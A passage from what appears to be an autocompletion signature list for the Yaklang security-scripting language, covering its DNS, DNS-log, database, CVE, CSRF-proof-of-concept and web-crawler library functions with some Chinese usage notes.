            functionName:
              "LoadVarFromFile(${1:path /*type: string*/}, ${2:exportsName /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "LoadVarFromFile(path string, exportsName string, opts ...yakEvalConfigOpt) ([]*yakVariable, error)",
          },
          {
            functionName: "IsYakFunc(${1:i})",
            document: "",
            definitionStr: "IsYakFunc(i any) bool",
          },
          {
            functionName:
              "Import(${1:file /*type: string*/}, ${2:exportsName /*type: string*/})",
            document: "",
            definitionStr: "Import(file string, exportsName string) (any, error)",
          },
          {
            functionName: "Eval(${1:i})",
            document: "",
            definitionStr: "Eval(i any) error",
          },
        ],
      },
      {
        libName: "dnslog",
        prefix: "dnslog.",
        functions: [
          {
            functionName: "script(${1:name /*type: string*/})",
            document: "",
            definitionStr: "script(name string) _dnslogConfigOpt",
          },
          {
            functionName: "random()",
            document: "",
            definitionStr: "random() _dnslogConfigOpt",
          },
          {
            functionName: "mode(${1:mode /*type: string*/})",
            document: "",
            definitionStr: "mode(mode string) _dnslogConfigOpt",
          },
          {
            functionName: "local(${1:isLocal /*type: bool*/})",
            document: "",
            definitionStr: "local(isLocal bool) _dnslogConfigOpt",
          },
          {
            functionName: "QueryCustomScript()",
            document: "",
            definitionStr: "QueryCustomScript()",
          },
          {
            functionName: "NewCustomDNSLog(${1:opts...})",
            document: "",
            definitionStr:
              "NewCustomDNSLog(opts ..._dnslogConfigOpt) *CustomDNSLog",
          },
          {
            functionName: "LookupFirst(${1:host /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr: "LookupFirst(host string, opt ...DNSOption) string",
          },
        ],
      },
      {
        libName: "dns",
        prefix: "dns.",
        functions: [
          {
            functionName: "timeout(${1:d /*type: float64*/})",
            document: "",
            definitionStr: "timeout(d float64) _dnsConfigOpt",
          },
          {
            functionName: "dnsServers(${1:servers...})",
            document: "",
            definitionStr: "dnsServers(servers ...string) _dnsConfigOpt",
          },
          {
            functionName: "QueryTXT(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "QueryTXT(target string, opts ..._dnsConfigOpt) []string",
          },
          {
            functionName: "QueryNS(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "QueryNS(target string, opts ..._dnsConfigOpt) []string",
          },
          {
            functionName:
              "QueryIPAll(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "QueryIPAll(target string, opts ..._dnsConfigOpt) []string",
          },
          {
            functionName: "QueryIP(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr: "QueryIP(target string, opts ..._dnsConfigOpt) string",
          },
          {
            functionName: "QuertAxfr(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "QuertAxfr(target string, opts ..._dnsConfigOpt) []string",
          },
        ],
      },
      {
        libName: "dictutil",
        prefix: "dictutil.",
        functions: [
          {
            functionName: "Mix(${1:raw...})",
            document: "",
            definitionStr: "Mix(raw ...any) (chan []string, error)",
          },
        ],
      },
      {
        libName: "db",
        prefix: "db.",
        functions: [
          {
            functionName: "saveHTTPFlowWithTags(${1:tags /*type: string*/})",
            document: "",
            definitionStr:
              "saveHTTPFlowWithTags(tags string) CreateHTTPFlowOptions",
          },
          {
            functionName: "YieldYakScriptAll()",
            document: "",
            definitionStr: "YieldYakScriptAll() chan *schema.YakScript",
          },
          {
            functionName: "YieldPayload(${1:raw}, ${2:extra...})",
            document: "",
            definitionStr:
              "YieldPayload(raw any, extra ...any) chan string  doc:YieldPayload means\n",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_YAK",
            document: "db.YAKIT_PLUGIN_TYPE_YAK: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_YAK: string",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_PORTSCAN",
            document: "db.YAKIT_PLUGIN_TYPE_PORTSCAN: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_PORTSCAN: string",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_PACKET_HACK",
            document: "db.YAKIT_PLUGIN_TYPE_PACKET_HACK: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_PACKET_HACK: string",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_NUCLEI",
            document: "db.YAKIT_PLUGIN_TYPE_NUCLEI: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_NUCLEI: string",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_MITM",
            document: "db.YAKIT_PLUGIN_TYPE_MITM: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_MITM: string",
          },
          {
            functionName: "YAKIT_PLUGIN_TYPE_CODEC",
            document: "db.YAKIT_PLUGIN_TYPE_CODEC: string",
            definitionStr: "db.YAKIT_PLUGIN_TYPE_CODEC: string",
          },
          {
            functionName: "SetProjectKey(${1:k}, ${2:v})",
            document: "",
            definitionStr: "SetProjectKey(k any, v any) error",
          },
          {
            functionName: "SetKey(${1:k}, ${2:v})",
            document: "",
            definitionStr: "SetKey(k any, v any) error",
          },
          {
            functionName:
              "SaveYakitPlugin(${1:scriptName /*type: string*/}, ${2:typeStr /*type: string*/}, ${3:content})",
            document: "",
            definitionStr:
              "SaveYakitPlugin(scriptName string, typeStr string, content any) error",
          },
          {
            functionName: "SaveYakitMenuItemByBatchExecuteConfig(${1:raw})",
            document: "",
            definitionStr: "SaveYakitMenuItemByBatchExecuteConfig(raw any) error",
          },
          {
            functionName: "SavePortFromResult(${1:t}, ${2:RuntimeId...})",
            document: "",
            definitionStr: "SavePortFromResult(t any, RuntimeId ...string) error",
          },
          {
            functionName:
              "SavePayloadByFile(${1:group /*type: string*/}, ${2:fileName /*type: string*/})",
            document: "",
            definitionStr:
              "SavePayloadByFile(group string, fileName string) error",
          },
          {
            functionName:
              "SavePayload(${1:group /*type: string*/}, ${2:payloadRaw})",
            document: "",
            definitionStr: "SavePayload(group string, payloadRaw any) error",
          },
          {
            functionName:
              "SaveHTTPFlowInstance(${1:flow /*type: *schema.HTTPFlow*/})",
            document: "",
            definitionStr: "SaveHTTPFlowInstance(flow *schema.HTTPFlow) error",
          },
          {
            functionName:
              "SaveHTTPFlowFromRawWithType(${1:url /*type: string*/}, ${2:req /*type: []byte*/}, ${3:rsp /*type: []byte*/}, ${4:typeStr /*type: string*/})",
            document: "",
            definitionStr:
              "SaveHTTPFlowFromRawWithType(url string, req []byte, rsp []byte, typeStr string) error",
          },
          {
            functionName:
              "SaveHTTPFlowFromRawWithOption(${1:url /*type: string*/}, ${2:req /*type: []byte*/}, ${3:rsp /*type: []byte*/}, ${4:exOption...})",
            document: "",
            definitionStr:
              "SaveHTTPFlowFromRawWithOption(url string, req []byte, rsp []byte, exOption ...yakit.CreateHTTPFlowOptions) error",
          },
          {
            functionName:
              "SaveHTTPFlowFromRaw(${1:url /*type: string*/}, ${2:req /*type: []byte*/}, ${3:rsp /*type: []byte*/})",
            document: "",
            definitionStr:
              "SaveHTTPFlowFromRaw(url string, req []byte, rsp []byte) error",
          },
          {
            functionName:
              "SaveHTTPFlowFromNativeWithType(${1:url /*type: string*/}, ${2:req /*type: *http.Request*/}, ${3:rsp /*type: *http.Response*/}, ${4:typeStr /*type: string*/})",
            document: "",
            definitionStr:
              "SaveHTTPFlowFromNativeWithType(url string, req *http.Request, rsp *http.Response, typeStr string) error",
          },
          {
            functionName:
              "SaveHTTPFlowFromNative(${1:url /*type: string*/}, ${2:req /*type: *http.Request*/}, ${3:rsp /*type: *http.Response*/})",
            document: "",
            definitionStr:
              "SaveHTTPFlowFromNative(url string, req *http.Request, rsp *http.Response) error",
          },
          {
            functionName: "SaveDomain(${1:domain /*type: string*/}, ${2:ip...})",
            document: "",
            definitionStr: "SaveDomain(domain string, ip ...string) error",
          },
          {
            functionName: "QueryUrlsByKeyword(${1:k /*type: string*/})",
            document: "",
            definitionStr: "QueryUrlsByKeyword(k string) chan string",
          },
          {
            functionName: "QueryUrlsAll()",
            document: "",
            definitionStr: "QueryUrlsAll() chan string",
          },
          {
            functionName: "QueryPortsByUpdatedAt(${1:timestamp /*type: int64*/})",
            document: "",
            definitionStr:
              "QueryPortsByUpdatedAt(timestamp int64) (chan *schema.Port, error)",
          },
          {
            functionName: "QueryPortsByTaskName(${1:taskName /*type: string*/})",
            document: "",
            definitionStr:
              "QueryPortsByTaskName(taskName string) (chan *schema.Port, error)",
          },
          {
            functionName:
              "QueryPortsByRuntimeId(${1:runtimeID /*type: string*/})",
            document: "",
            definitionStr:
              "QueryPortsByRuntimeId(runtimeID string) (chan *schema.Port, error)",
          },
          {
            functionName: "QueryPayloadGroups(${1:group /*type: string*/})",
            document: "",
            definitionStr: "QueryPayloadGroups(group string) []string",
          },
          {
            functionName: "QueryIPForIPS(${1:ip /*type: string*/})",
            document: "",
            definitionStr: "QueryIPForIPS(ip string) (*geo.ISP, error)",
          },
          {
            functionName: "QueryIPCity(${1:ip /*type: string*/})",
            document: "",
            definitionStr: "QueryIPCity(ip string) (*geo.City, error)",
          },
          {
            functionName: "QueryHostsByDomain(${1:keyword /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHostsByDomain(keyword string) (chan *schema.Host, error)",
          },
          {
            functionName: "QueryHostPortByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr: "QueryHostPortByNetwork(network string) chan string",
          },
          {
            functionName: "QueryHostPortByKeyword(${1:network /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHostPortByKeyword(network string) (chan *schema.Host, error)",
          },
          {
            functionName: "QueryHTTPFlowsByKeyword(${1:k /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHTTPFlowsByKeyword(k string) chan *schema.HTTPFlow",
          },
          {
            functionName: "QueryHTTPFlowsByID(${1:id...})",
            document: "",
            definitionStr:
              "QueryHTTPFlowsByID(id ...int64) chan *schema.HTTPFlow",
          },
          {
            functionName: "QueryHTTPFlowsAll()",
            document: "",
            definitionStr: "QueryHTTPFlowsAll() chan *schema.HTTPFlow",
          },
          {
            functionName: "QueryDomainsByTitle(${1:title /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByTitle(title string) (chan *schema.Domain, error)",
          },
          {
            functionName: "QueryDomainsByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByNetwork(network string) (chan *schema.Domain, error)",
          },
          {
            functionName:
              "QueryDomainsByDomainKeyword(${1:keyword /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByDomainKeyword(keyword string) (chan *schema.Domain, error)",
          },
          {
            functionName: "QueryAliveHost(${1:runtimeId /*type: string*/})",
            document: "",
            definitionStr:
              "QueryAliveHost(runtimeId string) chan *schema.AliveHost",
          },
          {
            functionName:
              "NewAliveHost(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "NewAliveHost(target string, opts ...yakit.AliveHostParamsOpt)",
          },
          {
            functionName: "GetYakitPluginByName(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              "GetYakitPluginByName(name string) (*schema.YakScript, error)",
          },
          {
            functionName: "GetProjectKey(${1:k})",
            document: "",
            definitionStr: "GetProjectKey(k any) string",
          },
          {
            functionName: "GetKey(${1:k})",
            document: "",
            definitionStr: "GetKey(k any) string",
          },
          {
            functionName: "DownloadGeoIP()",
            document: "",
            definitionStr: "DownloadGeoIP() error",
          },
          {
            functionName: "DeleteYakitMenuItemAll()",
            document: "",
            definitionStr: "DeleteYakitMenuItemAll() error",
          },
          {
            functionName: "DeleteYakScriptByName(${1:i /*type: string*/})",
            document: "",
            definitionStr: "DeleteYakScriptByName(i string) error",
          },
          {
            functionName: "DeletePayloadByGroup(${1:group /*type: string*/})",
            document: "",
            definitionStr: "DeletePayloadByGroup(group string) error",
          },
          {
            functionName: "DelKey(${1:k})",
            document: "",
            definitionStr: "DelKey(k any)",
          },
          {
            functionName:
              "CreateTemporaryYakScript(${1:t /*type: string*/}, ${2:code /*type: string*/}, ${3:suffix...})",
            document: "",
            definitionStr:
              "CreateTemporaryYakScript(t string, code string, suffix ...string) (string, error)",
          },
        ],
      },
      {
        libName: "cwe",
        prefix: "cwe.",
        functions: [
          {
            functionName: "Get(${1:i})",
            document: "",
            definitionStr: "Get(i any) *cveresources.CWE",
          },
        ],
      },
      {
        libName: "cve",
        prefix: "cve.",
        functions: [
          {
            functionName: "vendor(${1:v /*type: string*/})",
            document: "",
            definitionStr: "vendor(v string) CVEOption",
          },
          {
            functionName: "severity(${1:level /*type: string*/})",
            document: "",
            definitionStr: "severity(level string) CVEOption",
          },
          {
            functionName: "score(${1:score /*type: float64*/})",
            document: "",
            definitionStr: "score(score float64) CVEOption",
          },
          {
            functionName: "product(${1:p /*type: string*/}, ${2:v...})",
            document: "",
            definitionStr: "product(p string, v ...string) CVEOption",
          },
          {
            functionName: "parseToCpe(${1:cpe /*type: string*/})",
            document: "",
            definitionStr: "parseToCpe(cpe string) (*CPE, error)",
          },
          {
            functionName: "cwe(${1:cwe /*type: string*/})",
            document: "",
            definitionStr: "cwe(cwe string) CVEOption",
          },
          {
            functionName: "cve(${1:id /*type: string*/})",
            document: "",
            definitionStr: "cve(id string) CVEOption",
          },
          {
            functionName: "cpe(${1:c /*type: string*/})",
            document: "",
            definitionStr: "cpe(c string) CVEOption",
          },
          {
            functionName: "before(${1:year /*type: int*/}, ${2:data...})",
            document: "",
            definitionStr: "before(year int, data ...int) CVEOption",
          },
          {
            functionName: "after(${1:year /*type: int*/}, ${2:data...})",
            document: "",
            definitionStr: "after(year int, data ...int) CVEOption",
          },
          {
            functionName: "QueryEx(${1:i...})",
            document: "",
            definitionStr: "QueryEx(i ...any) chan *cveresources.CVE",
          },
          {
            functionName: "Query(${1:db /*type: *gorm.DB*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Query(db *gorm.DB, opts ...CVEOption) chan *cveresources.CVE",
          },
          {
            functionName: "NewStatistics(${1:source /*type: string*/})",
            document: "",
            definitionStr: "NewStatistics(source string) *Statistics",
          },
          {
            functionName:
              "LoadCVE(${1:fileDir /*type: string*/}, ${2:DbPath /*type: string*/}, ${3:years...})",
            document: "",
            definitionStr:
              "LoadCVE(fileDir string, DbPath string, years ...int)  doc:LoadCVE 从本地的CVE json数据加载构造数据库\n",
          },
          {
            functionName: "GetCVE(${1:cve /*type: string*/})",
            document: "",
            definitionStr: "GetCVE(cve string) *cveresources.CVE",
          },
          {
            functionName:
              "Download(${1:dir /*type: string*/}, ${2:cached /*type: bool*/})",
            document: "",
            definitionStr:
              "Download(dir string, cached bool) error  doc:DownLoad 从NVD下载CVE json数据到本地\n",
          },
        ],
      },
      {
        libName: "csrf",
        prefix: "csrf.",
        functions: [
          {
            functionName: "multipartDefaultValue(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'multipartDefaultValue(b bool) csrfConfig  doc:multipartDefaultValue 手动设置请求报文是否为multipart/form-data类型\n\n如果设置为true，则会生成使用JavaScript提交的漏洞验证(POC)\n\nExample:\n```\ncsrfPoc, err = csrf.Generate("POST / HTTP/1.1\\r\\nHost:example.com\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\n\\r\\nname=1&age=2", csrf.MultipartDefaultValue(true))\n```\n',
          },
          {
            functionName: "https(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'https(b bool) csrfConfig  doc:https 手动设置请求报文是否为HTTPS类型\n\nExample:\n```\ncsrfPoc, err = csrf.Generate("POST / HTTP/1.1\\r\\nHost:example.com\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\n\\r\\nname=1&age=2", csrf.HTTPS(true))\n```\n',
          },
          {
            functionName: "Generate(${1:raw}, ${2:opts...})",
            document: "",
            definitionStr:
              'Generate(raw any, opts ...csrfConfig) (string, error)  doc:Generate 根据传入的原始请求报文生成跨站请求伪造(CSRF)类型的漏洞验证(POC)，返回生成的POC HTML字符串与错误\n\nExample:\n```\ncsrfPoc, err = csrf.Generate("POST / HTTP/1.1\\r\\nHost:example.com\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\n\\r\\nname=1&age=2")\n```\n',
          },
        ],
      },
      {
        libName: "crawlerx",
        prefix: "crawlerx.",
        functions: [
          {
            functionName: "whitelist(${1:keywords...})",
            document: "",
            definitionStr: "whitelist(keywords ...string) ConfigOpt",
          },
          {
            functionName: "vue(${1:vue /*type: bool*/})",
            document: "",
            definitionStr: "vue(vue bool) ConfigOpt",
          },
          {
            functionName: "urlCheck(${1:check /*type: bool*/})",
            document: "",
            definitionStr: "urlCheck(check bool) ConfigOpt",
          },
          {
            functionName: "stealth(${1:stealth /*type: bool*/})",
            document: "",
            definitionStr: "stealth(stealth bool) ConfigOpt",
          },
          {
            functionName: "sourceType(${1:sourceType /*type: string*/})",
            document: "",
            definitionStr: "sourceType(sourceType string) ConfigOpt",
          },
          {
            functionName:
              "sessionStorage(${1:storage /*type: map[string]string*/})",
            document: "",
            definitionStr: "sessionStorage(storage map[string]string) ConfigOpt",
          },
          {
            functionName: "sensitiveWords(${1:words /*type: []string*/})",
            document: "",
            definitionStr: "sensitiveWords(words []string) ConfigOpt",
          },
          {
            functionName:
              "scanRepeatLevel(${1:scanRepeat /*type: repeatLevel*/})",
            document: "",
            definitionStr: "scanRepeatLevel(scanRepeat repeatLevel) ConfigOpt",
          },
          {
            functionName:
              "scanRangeLevel(${1:scanRange /*type: scanRangeLevel*/})",
            document: "",
            definitionStr: "scanRangeLevel(scanRange scanRangeLevel) ConfigOpt",
          },
          {
            functionName: "saveToDB(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "saveToDB(b bool) ConfigOpt",
          },
          {
            functionName: "runtimeId(${1:id /*type: string*/})",
            document: "",
            definitionStr: "runtimeId(id string) ConfigOpt",
          },
          {
            functionName: "runtimeID(${1:id /*type: string*/})",
            document: "",
            definitionStr: "runtimeID(id string) ConfigOpt",
          },
          {
            functionName:
              "response(${1:targetUrl /*type: string*/}, ${2:response /*type: string*/})",
            document: "",
            definitionStr:
              "response(targetUrl string, response string) ConfigOpt",
          },
          {
            functionName: "rawHeaders(${1:headerInfo /*type: string*/})",
            document: "",
            definitionStr: "rawHeaders(headerInfo string) ConfigOpt",
          },
          {
            functionName:
              "rawCookie(${1:domain /*type: string*/}, ${2:cookieInfo /*type: string*/})",
            document: "",
            definitionStr:
              "rawCookie(domain string, cookieInfo string) ConfigOpt",
          },
          {
            functionName: "pageTimeout(${1:timeout /*type: int*/})",
            document: "",
            definitionStr: "pageTimeout(timeout int) ConfigOpt",
          },
          {
            functionName: "maxUrl(${1:maxUrl /*type: int*/})",
            document: "",
            definitionStr: "maxUrl(maxUrl int) ConfigOpt",
          },
          {
            functionName: "maxDepth(${1:depth /*type: int*/})",
            document: "",
            definitionStr: "maxDepth(depth int) ConfigOpt",
          },
          {
            functionName:
              "localStorage(${1:storage /*type: map[string]string*/})",
            document: "",
            definitionStr: "localStorage(storage map[string]string) ConfigOpt",
          },
          {
            functionName: "leakless(${1:leakless /*type: string*/})",
            document: "",
            definitionStr: "leakless(leakless string) ConfigOpt",
          },
          {
            functionName: "jsResultSend(${1:storage /*type: func(s string)*/})",
            document: "",
            definitionStr: "jsResultSend(storage func(s string)) ConfigOpt",
          },
          {
            functionName: "invalidSuffix(${1:suffix /*type: []string*/})",
            document: "",
            definitionStr: "invalidSuffix(suffix []string) ConfigOpt",
          },
          {
            functionName: "ignoreQueryName(${1:names...})",
            document: "",
            definitionStr: "ignoreQueryName(names ...string) ConfigOpt",
          },
          {
            functionName: "headers(${1:headersInfo /*type: map[string]string*/})",
            document: "",
            definitionStr: "headers(headersInfo map[string]string) ConfigOpt",
          },
          {
            functionName: "fullTimeout(${1:timeout /*type: int*/})",
            document: "",
            definitionStr: "fullTimeout(timeout int) ConfigOpt",
          },
          {
            functionName: "fromPlugin(${1:fromPlugin /*type: string*/})",
            document: "",
            definitionStr: "fromPlugin(fromPlugin string) ConfigOpt",
          },
          {
            functionName: "formFill(${1:formFills /*type: map[string]string*/})",
            document: "",
            definitionStr: "formFill(formFills map[string]string) ConfigOpt",
          },
          {
            functionName: "fileInput(${1:fileInput /*type: map[string]string*/})",
            document: "",
            definitionStr: "fileInput(fileInput map[string]string) ConfigOpt",
          },
          {
            functionName:
              "extraWaitLoadTime(${1:extraWaitLoadTime /*type: int*/})",
            document: "",
            definitionStr: "extraWaitLoadTime(extraWaitLoadTime int) ConfigOpt",
          },
          {
            functionName:
              "evalJs(${1:target /*type: string*/}, ${2:evalJs /*type: string*/})",
            document: "",
            definitionStr: "evalJs(target string, evalJs string) ConfigOpt",
          },
          {
            functionName:
              "cookies(${1:domain /*type: string*/}, ${2:cookiesInfo /*type: map[string]string*/})",
            document: "",
            definitionStr:
              "cookies(domain string, cookiesInfo map[string]string) ConfigOpt",
          },
          {
            functionName: "concurrent(${1:concurrent /*type: int*/})",
            document: "",
            definitionStr: "concurrent(concurrent int) ConfigOpt",
          },
          {
            functionName: "browserInfo(${1:data /*type: string*/})",
            document: "",
            definitionStr: "browserInfo(data string) ConfigOpt",
          },
          {
            functionName: "blacklist(${1:keywords...})",
            document: "",
            definitionStr: "blacklist(keywords ...string) ConfigOpt",
          },
          {
            functionName: "UnlimitedDomainScan",
            document: "crawlerx.UnlimitedDomainScan: crawlerx.scanRangeLevel",
            definitionStr:
              "crawlerx.UnlimitedDomainScan: crawlerx.scanRangeLevel",
          },
          {
            functionName: "UnLimitRepeat",
            document: "crawlerx.UnLimitRepeat: crawlerx.repeatLevel",
            definitionStr: "crawlerx.UnLimitRepeat: crawlerx.repeatLevel",
          },
          {
            functionName: "SubMenuScan",
            document: "crawlerx.SubMenuScan: crawlerx.scanRangeLevel",
            definitionStr: "crawlerx.SubMenuScan: crawlerx.scanRangeLevel",
          },
          {
            functionName: "StartCrawler(${1:url /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "StartCrawler(url string, opts ...ConfigOpt) (chan ReqInfo, error)",
          },
          {
            functionName:
              "PageScreenShot(${1:targetUrl /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "PageScreenShot(targetUrl string, opts ...ConfigOpt) (code string, err error)",
          },
          {
            functionName: "MediumRepeatLevel",
            document: "crawlerx.MediumRepeatLevel: crawlerx.repeatLevel",
            definitionStr: "crawlerx.MediumRepeatLevel: crawlerx.repeatLevel",
          },
          {
            functionName: "LowRepeatLevel",
            document: "crawlerx.LowRepeatLevel: crawlerx.repeatLevel",
            definitionStr: "crawlerx.LowRepeatLevel: crawlerx.repeatLevel",
          },
          {
            functionName: "HighRepeatLevel",
            document: "crawlerx.HighRepeatLevel: crawlerx.repeatLevel",
            definitionStr: "crawlerx.HighRepeatLevel: crawlerx.repeatLevel",
          },
          {
            functionName: "ExtremeRepeatLevel",
            document: "crawlerx.ExtremeRepeatLevel: crawlerx.repeatLevel",
            definitionStr: "crawlerx.ExtremeRepeatLevel: crawlerx.repeatLevel",
          },
          {
            functionName: "AllDomainScan",
            document: "crawlerx.AllDomainScan: crawlerx.scanRangeLevel",
            definitionStr: "crawlerx.AllDomainScan: crawlerx.scanRangeLevel",
          },
        ],
      },
      {
        libName: "crawler",
        prefix: "crawler.",
        functions: [
          {
            functionName: "userAgent(${1:ua /*type: string*/})",
            document: "",
            definitionStr:
              'userAgent(ua string) ConfigOpt  doc:userAgent 是一个选项函数，用于指定爬虫时的User-Agent\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.userAgent("yaklang-crawler"))\n```\n',
          },
          {
            functionName: "urlRegexpInclude(${1:re /*type: string*/})",
            document: "",
            definitionStr:
              'urlRegexpInclude(re string) ConfigOpt  doc:urlRegexpInclude 是一个选项函数，用于指定爬虫时的URL正则白名单\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.urlRegexpInclude(`\\.html`))\n```\n',
          },
          {
            functionName: "urlRegexpExclude(${1:re /*type: string*/})",
            document: "",
            definitionStr:
              'urlRegexpExclude(re string) ConfigOpt  doc:urlRegexpExclude 是一个选项函数，用于指定爬虫时的URL正则黑名单\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.urlRegexpExclude(`\\.jpg`))\n```\n',
          },
          {
            functionName: "urlExtractor(${1:f /*type: func(*Req) []any*/})",
            document: "",
            definitionStr:
              'urlExtractor(f func(*Req) []any) ConfigOpt  doc:urlExtractor 是一个选项函数，它接收一个函数作为参数，用于为爬虫添加额外的链接提取规则\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.urlExtractor(func(req) {\n尝试编写自己的规则，从响应体(req.Response()或req.ResponseRaw())中提取额外的链接\n})\n```\n',
          },
          {
            functionName: "ua(${1:ua /*type: string*/})",
            document: "",
            definitionStr:
              'ua(ua string) ConfigOpt  doc:userAgent 是一个选项函数，用于指定爬虫时的User-Agent\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.userAgent("yaklang-crawler"))\n```\n',
          },
          {
            functionName: "timeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'timeout(f float64) ConfigOpt  doc:connectTimeout 是一个选项函数，用于指定爬虫时的连接超时时间，默认为10s\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.connectTimeout(5))\n```\n',
          },
          {
            functionName: "responseTimeout(${1:c /*type: *Config*/})",
            document: "",
            definitionStr: "responseTimeout(c *Config) any",
          },
          {
            functionName: "proxy(${1:proxies...})",
            document: "",
            definitionStr:
              'proxy(proxies ...string) ConfigOpt  doc:proxy 是一个选项函数，用于指定爬虫时的代理\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.proxy("http://127.0.0.1:8080"))\n```\n',
          },
          {
            functionName: "maxUrls(${1:limit /*type: int*/})",
            document: "",
            definitionStr:
              'maxUrls(limit int) ConfigOpt  doc:maxUrls 是一个选项函数，用于指定爬虫时的最大链接数，默认为10000\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.maxUrls(20000))\n```\n',
          },
          {
            functionName: "maxRetry(${1:limit /*type: int*/})",
            document: "",
            definitionStr:
              'maxRetry(limit int) ConfigOpt  doc:maxRetry 是一个选项函数，用于指定爬虫时的最大重试次数，默认为3\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.maxRetry(10))\n```\n',
          },
          {
            functionName: "maxRequest(${1:limit /*type: int*/})",
            document: "",
            definitionStr:
              'maxRequest(limit int) ConfigOpt  doc:maxRequest 是一个选项函数，用于指定爬虫时的最大请求数，默认为1000\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.maxRequest(10000))\n```\n',
          },
          {
            functionName: "maxRedirect(${1:maxRedirectTimes /*type: int*/})",
            document: "",
            definitionStr:
              'maxRedirect(maxRedirectTimes int) ConfigOpt  doc:maxRedirect 是一个选项函数，用于指定爬虫时的最大重定向次数，默认为5\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.maxRedirect(10))\n```\n',
          },
          {
            functionName: "maxDepth(${1:depth /*type: int*/})",
            document: "",
            definitionStr:
              'maxDepth(depth int) ConfigOpt  doc:maxDepth 是一个选项函数，用于指定爬虫时的最大深度，默认为5\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.maxDepth(10))\n```\n',
          },
          {
            functionName: "jsParser(${1:enable...})",
            document: "",
            definitionStr:
              'jsParser(enable ...bool) ConfigOpt  doc:jsParser 是一个选项函数，用于指定爬虫时是否进行对于JS的代码解析。\n\n填写该选项默认开启，也可以传入false强制关闭。\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.jsParser()) // 开启\ncrawler.Start("https://example.com", crawler.jsParser(true)) // 开启\ncrawler.Start("https://example.com", crawler.jsParser(false)) // 关闭\n```\n',
          },
          {
            functionName:
              "header(${1:k /*type: string*/}, ${2:v /*type: string*/})",
            document: "",
            definitionStr:
              'header(k string, v string) ConfigOpt  doc:header 是一个选项函数，用于指定爬虫时的请求头\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.header("User-Agent", "yaklang-crawler"))\n```\n',
          },
          {
            functionName: "forbiddenFromParent(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'forbiddenFromParent(b bool) ConfigOpt  doc:forbiddenFromParent 是一个选项函数，用于指定爬虫时的是否禁止从根路径发起请求，默认为false\n\n对于一个起始URL，如果其并不是从根路径开始且没有禁止从根路径发起请求，那么爬虫会从其根路径开始爬取\n\nExample:\n```\ncrawler.Start("https://example.com/a/b/c", crawler.forbiddenFromParent(false)) // 这会从 https://example.com/ 开始爬取\n```\n',
          },
          {
            functionName: "domainInclude(${1:domain /*type: string*/})",
            document: "",
            definitionStr:
              'domainInclude(domain string) ConfigOpt  doc:domainInclude 是一个选项函数，用于指定爬虫时的域名白名单\n\ndomain允许使用glob语法，例如*.example.com\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.domainInclude("*.example.com"))\n```\n',
          },
          {
            functionName: "domainExclude(${1:domain /*type: string*/})",
            document: "",
            definitionStr:
              'domainExclude(domain string) ConfigOpt  doc:domainExclude 是一个选项函数，用于指定爬虫时的域名黑名单\n\ndomain允许使用glob语法，例如*.example.com\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.domainExclude("*.baidu.com"))\n```\n',
          },
          {
            functionName: "disallowSuffix(${1:d /*type: []string*/})",
            document: "",
            definitionStr:
              'disallowSuffix(d []string) ConfigOpt  doc:disallowSuffix 是一个选项函数，用于指定爬虫时的后缀黑名单\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.disallowSuffix(".css", ".jpg", ".png")) // 爬虫时不会爬取css、jpg、png文件\n```\n',
          },
          {
            functionName:
              "cookie(${1:k /*type: string*/}, ${2:v /*type: string*/})",
            document: "",
            definitionStr:
              'cookie(k string, v string) ConfigOpt  doc:cookie 是一个选项函数，用于指定爬虫时的cookie\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.cookie("key", "value"))\n```\n',
          },
          {
